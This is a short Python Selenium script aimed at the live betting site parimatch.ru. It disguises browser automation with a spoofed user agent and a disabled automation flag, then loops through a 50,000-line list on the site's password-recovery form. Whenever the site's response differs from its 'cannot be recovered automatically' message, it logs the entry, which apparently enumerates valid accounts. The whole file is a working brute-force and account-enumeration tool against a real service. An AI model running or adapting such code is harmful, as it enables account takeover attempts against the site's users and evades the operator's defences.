# pari_check
import time
from fake_useragent import UserAgent
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys

def browser():
    options = webdriver.ChromeOptions()
    options.add_experimental_option('useAutomationExtension', False)
    options.add_argument("--disable-blink-features=AutomationControlled")
    options.add_argument("--enable-javascript")
    options.headless = False
    ua = UserAgent()
    uaa = ua.data['browsers']['firefox'][0]
    print(uaa)
    options.add_argument(f'user-agent={uaa}')
    driver = webdriver.Chrome(options=options, executable_path=r"C:\chromedriver.exe")
    driver.get("https://www.parimatch.ru/")
    f = open(r'C:\50k.txt', 'r')
    time.sleep(2)
    driver.find_element(By.XPATH, r'//*[@id="root"]/div[1]/div/div[3]/div[2]/a/button/span').click()
    time.sleep(2)
    driver.find_element(By.XPATH, r'//*[@id="root"]/div[2]/div[2]/div/div/a[1]').click()
    time.sleep(2)
    time.sleep(2)
    driver.find_element(By.XPATH,
                            r'/html/body/div[3]/div[2]/div[2]/div/div/div[1]/form/div[2]/div/div[2]/select/option[3]').click()
    time.sleep(2)
    driver.find_element(By.XPATH,
                            r'/html/body/div[3]/div[2]/div[2]/div/div/div[1]/form/div[1]/div/div[2]/input').send_keys("abraham@mail.ru")
    driver.find_element(By.XPATH, r'//*[@id="root"]/div[2]/div[2]/div/div/div[1]/form/button/span').click()
    for line in f:
        time.sleep(2)
        if driver.find_element(By.XPATH, r'//*[@id="root"]/div[2]/div[2]/div/div/div[1]/div').text == "Пароль к данному номеру счета невозможно восстановить автоматически":
            time.sleep(1)
            driver.find_element(By.CLASS_NAME, r"_3Mkr44AETtk2f49E01Pjx-").send_keys(line)
            time.sleep(3)
            driver.find_element(By.XPATH, r"/html/body/div[3]/div[2]/div[2]/div/div/div[2]/form/button/span").click()
            time.sleep(2)
            bbb = driver.find_element(By.CLASS_NAME, r"_3Mkr44AETtk2f49E01Pjx-")
            bbb.send_keys(Keys.CONTROL, 'a')
            bbb.send_keys('')
            time.sleep(2)
        else:
            print(line)
            ff = open(r'C:\Users\user\Desktop\text.txt', 'a')
            ff.write(line)
            return


browser()

